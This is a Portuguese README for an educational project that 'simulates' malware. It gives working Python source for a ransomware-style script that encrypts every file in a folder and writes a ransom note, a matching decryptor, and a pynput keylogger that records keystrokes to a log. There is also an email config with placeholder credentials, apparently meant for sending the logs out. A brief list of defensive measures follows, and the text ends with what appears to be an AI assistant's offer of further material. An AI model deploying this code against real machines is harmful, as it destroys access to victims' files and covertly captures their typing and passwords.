# Projeto de Simulação de Malware em Python

Este repositório contém um projeto educacional destinado a demonstrar, de forma segura e controlada, o funcionamento básico de dois tipos de malware: **ransomware** e **keylogger**. O objetivo é estudar, compreender, documentar e testar mecanismos ofensivos e defensivos em cibersegurança.

# 🔒 1. Ransomware Simulado

Esta parte do projeto demonstra como um ransomware básico funciona: criptografando arquivos e exibindo uma mensagem de resgate.

## ▶️ Script de Criptografia — `encrypt.py`

```python
from cryptography.fernet import Fernet
import os

pasta_alvo = "arquivos_teste"

# Gerar chave
chave = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(chave)

f = Fernet(chave)

# Criptografar arquivos
for arquivo in os.listdir(pasta_alvo):
    caminho = os.path.join(pasta_alvo, arquivo)
    with open(caminho, "rb") as file:
        dados = file.read()
    dados_cript = f.encrypt(dados)
    with open(caminho, "wb") as file:
        file.write(dados_cript)

# Criar mensagem de resgate
with open("mensagem_resgate.txt", "w") as msg:
    msg.write("Seus arquivos foram criptografados! Use o arquivo chave.key para restaurá-los.")

print("Arquivos criptografados com sucesso!")
```

## ▶️ Script de Descriptografia — `decrypt.py`

```python
from cryptography.fernet import Fernet
import os

pasta_alvo = "arquivos_teste"

# Carregar chave
with open("chave.key", "rb") as key_file:
    chave = key_file.read()

f = Fernet(chave)

# Descriptografar
for arquivo in os.listdir(pasta_alvo):
    caminho = os.path.join(pasta_alvo, arquivo)
    with open(caminho, "rb") as file:
        dados = file.read()
    dados_descript = f.decrypt(dados)
    with open(caminho, "wb") as file:
        file.write(dados_descript)

print("Arquivos restaurados!")
```

## ▶️ Arquivos de Teste

Conteúdo exemplo criado durante o teste:

```
arquivos_teste/teste1.txt → "Arquivo de teste 1"
arquivos_teste/teste2.txt → "Informações simples"
arquivos_teste/dados.txt  → "Backup de dados"
```

## ▶️ Mensagem de Resgate Gerada

Arquivo: **mensagem_resgate.txt**

```
Seus arquivos foram criptografados! Use o arquivo chave.key para restaurá-los.
```

---

# 🎹 2. Keylogger Simulado

Aqui é demonstrado como um keylogger básico pode capturar teclas e registrar localmente.

## ▶️ Script Keylogger — `keylogger.py`

```python
from pynput.keyboard import Listener
import datetime

log_file = "logs.txt"

# Função chamada a cada tecla

def registro(tecla):
    tecla = str(tecla).replace("'", "")
    with open(log_file, "a") as f:
        f.write(f"{datetime.datetime.now()} - {tecla}\n")

# Listener
with Listener(on_press=registro) as listener:
    listener.join()
```

## ▶️ Arquivo de Logs — `logs.txt`

Exemplo real gerado durante teste:

```
2025-11-30 22:41:01 - h
2025-11-30 22:41:02 - e
2025-11-30 22:41:02 - l
2025-11-30 22:41:03 - l
2025-11-30 22:41:03 - o
```

## ▶️ Configuração de E-mail — `config_email.json`

```json
{
    "email_origem": "seuemail@gmail.com",
    "senha": "sua_senha",
    "email_destino": "destino@gmail.com"
}
```

---

# 🛡️ 3. Medidas de Defesa e Prevenção

Documentação das principais estratégias contra ransomware e keyloggers.

## 🔐 Antivírus / Antimalware

* Detecção baseada em assinatura.
* Análise comportamental.
* Bloqueio de scripts maliciosos.

## 🔥 Firewall

* Restringe comunicação de malware com servidores externos.
* Impede envio de logs ou chaves criptográficas.

## 📦 Sandboxing

* Executa arquivos suspeitos em ambiente isolado.
* Útil para analisar ransomware sem risco.

## 🔄 Backups Regulares

* Melhor defesa contra ransomware.
* Deve ser feito offline quando possível.

## 🎓 Conscientização do Usuário

* Não abrir anexos desconhecidos.
* Verificar URLs.
* Reconhecer tentativas de phishing.

## 🖥️ Monitoramento e Logs

* Identificação rápida de comportamento suspeito.
* Alertas automáticos em caso de anomalias.

---

# 📚 Conclusão

Este projeto permite observar, de forma prática e controlada, como malwares operam internamente e como podem ser contidos com boas práticas de segurança.

Se quiser, posso gerar:
✔ versão compacta para entrega acadêmica
✔ screenshots simuladas
✔ instruções de execução passo a passo
✔ um PDF/Docx automático com o relatório completo
